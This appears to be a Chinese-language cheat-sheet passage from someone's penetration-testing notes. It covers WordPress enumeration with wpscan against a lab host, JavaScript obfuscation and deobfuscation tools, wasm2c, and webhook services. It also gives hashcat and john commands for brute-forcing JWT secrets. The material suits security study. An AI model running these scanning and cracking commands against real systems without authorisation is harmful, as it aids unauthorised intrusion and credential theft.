起手式一定是用 wpscan 去掃 plugin 版本，查 exploit
* 所以流程是：(nmap+ffuf)列舉發現 WordPress → 識別 plugin → searchsploit 找漏洞 → 手動測試或 sqlmap 利用。不需要 wpscan，標準的 web 列舉流程就能走到這一步。
* [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
    ```bash
    # 跑 wpscan 找外掛和使用者
    $ wpscan --url http://alvida-eatery.local -e ap,at,u --plugins-detection aggressive # 代表 enum 出 all plugin/all theme/user
    ```

## Tools

| Fuck| Beautifier|
| --- | --- |
| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/)| 把JS的程式變成可讀性很差的東西 | [JSNice](http://www.jsnice.org/) |
|[jjencode](https://utf-8.jp/public/jjencode.html)|[JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案|
|[aaencode](https://utf-8.jp/public/aaencode.html)|[JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)|
|[Esolang List](https://esolangs.org/wiki/Language_list)|[JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)|
||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|

* psysh: PHP的互動式shell

* wasm → c: [wabt](https://github.com/WebAssembly/wabt)
    ```bash
    # 安裝Cmake，所有過程一定要用WSL
    $ mkdir build && cd build
    $ cmake ..
    $ cmake --build .
    # 按照說明build完後進到./build
    $ ./wasm2c {wasm file path} -o {output c file path}
    ```

* Webhook
    * [Webhook.site](https://webhook.site/)
    * [Beeceptor](https://beeceptor.com/)
    * [Ngrok](https://ngrok.com/)

* [JWT Decoder/Encoder](https://www.jwt.io/)

* 爆破JWT
    * 利用Hashcat
        ```bash
        $ hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a
        ```
    * 利用John
    ```bash
    $ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256  
    ```